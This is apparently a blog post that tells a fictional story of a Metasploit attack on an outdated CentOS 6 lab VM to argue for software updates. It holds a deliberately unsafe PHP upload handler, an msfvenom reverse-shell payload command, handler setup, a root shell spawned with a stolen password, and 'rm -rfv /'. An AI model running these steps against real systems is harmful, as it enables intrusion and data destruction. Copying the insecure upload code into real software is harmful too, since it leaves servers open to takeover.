# Attacking CentOS6 Virtual Machines


<!--more-->
> Although the penetration process is involved, this article's main topic is not about penetration testing. Please read it with a rational mindset.

## The reason for writing this blog post

Recently, I have been hearing different opinions on software updates. On one hand, some argue that in certain cases, updating can be counterproductive, leading to unnecessary workload or even rewriting. On the other hand, others argue that continuous updates are necessary for a better user experience.

I am not sure which side is right, but I am curious. I wanted to know what would happen if I do not update software, so I took it upon myself to simulate an attack on a commercial company's server using a virtual machine. The system used was CentOS 6, and I attempted to use various tools to try and breach its security.

My goal was to simulate what could happen if a company were to be targeted by hackers while still using CentOS 6.0 in 2020.


## Simulation Environment

> Attacker platform: Arch Linux
>
> IP: 192.168.0.109
>
> Victim platform: CentOS 6.1 on VirtualBox
>
> IP: 192.168.0.116

**Suppose** this is a company where non-technical personnel lead the technical staff, and they have not updated the software used in development (including the operating system of their development machines and servers) for a long time.

We can imagine this virtual machine as their server and conduct some attack tests on it. Because the management of this company is non-technical, the software on the server not only has outdated versions but also lacks any defensive measures.

Additionally, due to unsatisfactory work hours, the programmers have a "get the job done" attitude, resulting in PHP code on the backend such as this:

```php
<?php
if ($_FILES["file"]["error"] > 0)
{
    echo "Error: " . $_FILES["file"]["error"] . "<br>";
}
else
{
    echo "Uploaded file name: " . $_FILES["file"]["name"] . "<br>";
    echo "File type: " . $_FILES["file"]["type"] . "<br>";
    echo "File size: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";
    echo "Temporary storage location of file: " . $_FILES["file"]["tmp_name"];
    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);
    echo "File stored in: " . "upload/" . $_FILES["file"]["name"];
}
?>
```

> Although the simulation has limitations, I personally believe that it is sufficient for abstract testing purposes.


## Process of attack

Someone always likes to cause trouble, and a hacker has scanned the server...
```bash
$ sudo nmap -O -v 192.168.0.116
```

The result is as follows:
```txt
Nmap scan report for 192.168.0.116
Host is up (0.00028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Uptime guess: 49.708 days (since Sat Aug  8 02:56:12 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

Read data files from: /usr/bin/../share/nmap
OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
```

He was surprised to find that the kernel version was only `2.6.32`, which was a first for him. In addition, there were open ports for SSH and HTTP, which gave him a good opportunity.

He attempted to access the website and discovered a file upload point on the site.


![](/img/2020-09-26_21-18.png)

With a "let's give it a try" attitude, he generated a payload using msf.
```bash
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.109 LPORT=4444 -o shell.php
```

He selected a file and clicked upload, and was surprised to find that not only was the upload successful, but he was also informed of its location.
![](/img/2020-09-26_21-22.png)

So he launched `msfconsole`.
```bash
$ msfconsole
```
And he used the exploit/multi/handler module.
```txt
msf5 > use exploit/multi/handler 
```
He then proceeded to set the parameters one by one.
```txt
msf5 exploit(multi/handler) > set LHOST 192.168.0.109
```

```txt
msf5 exploit(multi/handler) > set LPORT 4444
```

```txt
set payload php/meterpreter/reverse_tcp
```

The final step was to run the module.

```txt
msf5 exploit(multi/handler) > run
```

Then msf began listening.
```txt

[*] Started reverse TCP handler on 192.168.0.109:4444 

```

At this point, he modified the file address and link as prompted and accessed it:

>`http://192.168.0.116/upload/shell.php`

Msf immediately produced results. It's easy to imagine how poor the server's security measures were.

```txt
[*] Started reverse TCP handler on 192.168.0.109:4444 
[*] Sending stage (38288 bytes) to 192.168.0.116
[*] Meterpreter session 1 opened (192.168.0.109:4444 -> 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800

meterpreter > 
```

Now he began retrieving brief system information, such as the `operating system` and `kernel version`.

```txt
meterpreter > sysinfo
Computer    : localhost
OS          : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > cat /etc/issue
CentOS release 6.10 (Final)
Kernel \r on an \m
```
He also attempted to determine the current user's privileges.
```txt
meterpreter > getuid
Server username: apache (48)
```

The permissions are still quite low, so while he may not be able to do anything that would cause significant damage to the company, he can still spy and wreak havoc. But would the hacker be satisfied with just that? The answer is no, because he wants to escalate his privileges and obtain root access, which would allow him to do whatever he wants.

Due to the fact that the system and kernel of this server are too outdated, most of the code used to exploit vulnerabilities only works on kernel versions 3.x or above, or cannot be compiled at all.

It looks like he needs to think of another way.

During the day, he rides his motorcycle through the streets and alleys delivering food, and at night he roams the network as a hacker.

By chance, he went to deliver food ordered by an employee of that company and, as he entered the office area, he accidentally saw a note stuck to a monitor.

There were some numbers and letters written on it, perhaps something useful.

While the employees were eating, he secretly took a picture of the note with his phone and left.

As luck would have it, this note contained the password that had just been changed and would not be updated again for a while.

After work, he returned to his terminal and attempted to log in directly as root using the stolen password.

```txt
meterpreter > shell
Process 1376 created.
Channel 2 created.
```
He was able to obtain an interactive shell.
```txt
/bin/sh -i
sh: no job control in this shell
sh-4.1$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.1$ 
```
He logged in successfully.
```txt
bash-4.1$ su root
su root
Password: ************

[root@localhost upload]# 
```

As we can see, he was able to log in successfully with ease, and now he has root privileges at his fingertips.


```txt
[root@localhost upload]# whoami
whoami
root
[root@localhost upload]# id
id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
[root@localhost upload]# 
```

Yes, he could do whatever he wanted now...

And so, in the end, he proceeded to delete everything.

```txt
[root@localhost upload]# rm -rfv /
```
The company suffered significant losses as a result.

## Conclusion

Although the story above is purely fictional and the attack was only carried out in a simulated environment, it is worth pondering over what we can see...

* Systems that are not updated are prone to attacks.
* Code that is not updated is prone to vulnerabilities.
* Slow password updates can lead to leaks.
* Vulnerabilities must be fixed by updating software; otherwise, they will be exploited.

And as for what we cannot see...

Software is ultimately created by humans, and there is no perfection with humans. We must constantly reflect on ourselves and our creations.

Whether as users or developers, updating what needs to be updated is a normal part of life. There may be differences in speed, but progress must be made. Standing still or even moving backwards is not an option.

For software to be updated is like how humans need to self-reflect. If humans fail to self-reflect, their future will be bleak. If software is not updated, it will be abandoned by people and forgotten.

Even worse, it could be easily destroyed by a script kiddie who delivers food, just like the joke I told earlier.

The above is just my personal opinion. If there are any errors, please feel free to correct me in the comments below.


